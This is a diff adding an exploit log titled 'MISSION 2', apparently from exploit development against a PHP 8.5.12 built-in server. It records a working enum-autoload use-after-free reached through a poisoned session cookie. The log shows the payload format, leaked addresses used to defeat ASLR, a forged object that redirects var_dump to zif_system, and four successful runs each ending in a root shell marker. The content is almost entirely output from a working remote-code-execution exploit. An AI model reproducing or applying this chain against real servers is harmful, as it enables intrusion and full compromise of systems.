@@ -1,0 +1,40 @@
+############################################################
+# MISSION 2 - E: enum-autoload UAF -> full RCE via SESSION DECODE
+# target: plain2 PHP 8.5.12 built-in server, ASLR on, no gdb
+# poison: sess file = x|a:3:{i:0;E:11:Missing:Foo;...}
+# 2026-10-24T21:20:11Z
+############################################################
+--- run 1: GET with poisoned session cookie ---
+M1 block2 = 0x7c192e889000
+M2 T_u5=0x7c192e888070 T_u13=0x7c192e8880f0 spacing=128
+M2 ORACLE1=0x62b4d7bfe460 ORACLE2=0x62b4d7bfe460
+M2-DONE base=0x62b4d6c00000 zif_system=0x62b4d7123c60
+[PASS run 1] marker: uid=0(root) gid=0(root) groups=0(root)
+--- run 2: GET with poisoned session cookie ---
+M1 block2 = 0x76012ce89000
+M2 T_u5=0x76012ce88070 T_u13=0x76012ce880f0 spacing=128
+M2 ORACLE1=0x59812c7fe460 ORACLE2=0x59812c7fe460
+M2-DONE base=0x59812b800000 zif_system=0x59812bd23c60
+[PASS run 2] marker: uid=0(root) gid=0(root) groups=0(root)
+--- run 3: GET with poisoned session cookie ---
+M1 block2 = 0x7a2f3f4a9000
+M2 T_u5=0x7a2f3f49a070 T_u13=0x7a2f3f49a0f0 spacing=128
+M2 ORACLE1=0x596fb43fe460 ORACLE2=0x596fb43fe460
+M2-DONE base=0x596fb3400000 zif_system=0x596fb3923c60
+[PASS run 3] marker: uid=0(root) gid=0(root) groups=0(root)
+--- run 4: GET with poisoned session cookie ---
+M1 block2 = 0x7092cbea9000
+M2 T_u5=0x7092cbe9a070 T_u13=0x7092cbe9a0f0 spacing=128
+M2 ORACLE1=0x59f7fb9fe460 ORACLE2=0x59f7fb9fe460
+M2-DONE base=0x59f7faa00000 zif_system=0x59f7faf23c60
+[PASS run 4] marker: uid=0(root) gid=0(root) groups=0(root)
+---- diag (last) ----
+M1 block2 = 0x7092cbea9000
+M2 T_u5=0x7092cbe9a070 T_u13=0x7092cbe9a0f0 spacing=128
+M2 ORACLE1=0x59f7fb9fe460 ORACLE2=0x59f7fb9fe460
+M2-DONE base=0x59f7faa00000 zif_system=0x59f7faf23c60
+M3-STR strlen=8160
+M3 reclaim OK
+M3 BASE verified
+M3 forged OBJ=0x7092cbea9098
+TRIGGER var_dump -> zif_system
